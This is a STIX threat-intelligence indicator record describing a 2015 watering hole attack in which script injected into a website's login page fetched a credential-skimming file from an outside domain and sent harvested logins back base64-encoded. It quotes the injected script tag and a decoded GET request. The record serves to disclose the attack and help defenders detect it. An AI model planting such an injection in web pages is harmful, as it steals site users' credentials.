stix:STIX_Header.stix:Title: Wateringhole Attack Harvests User Credentials
stix:STIX_Header.stix:Description:
On or before 22 April 2015, unknown attackers executed a watering hole attack by embedding malicious JavaScript in the login page of the website: www.usaftacp.org/login
The credential harvesting JavaScript could allow the attacker to attempt lateral movement throughout networks, exfiltrate sensitive information, and maintain persistence within the network to compromise additional systems.
In a watering hole attack, malicious actors exploit a resource, such as a website, that their intended targets are likely to use or visit. The attackers then wait for their intended targets to use the resource or visit the compromised website. When that happens, the intended targets are exploited.

stix:Indicator.indicator:Description:
On or before 22 April 2015, unknown attackers executed a watering hole attack by embedding a malicious JavaScript in the login page of the website: www.usaftacp.org/login
When a user browsed to the login page, the following embedded script sent a GET request for the wp.js file, which was obfuscated in hexadecimal: <script type="text/javascript" src="//conyouse.com/wp.js"></script>
Example of the decoded GET request:
GET /wp.js HTTP/1.1 Accept: */* Referer: http://www.usaftacp.org/login/?redirect_to=http%3A%2F%2Fusaftacp.org%2Fmy-account%2Fmembership-checkout%2F%3Flevel%3D6 Accept-Language: en-US User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8) Accept-Encoding: gzip, deflate Host: conyouse.com Cache-Control: max-stale=0 Pragma: no-cache
The GET request invoked a second script, scr.js. When the user logged onto the page, the scr.js file captured the login credentials and crafted a BASE64 encoded GET request to submit back to the malicious server.
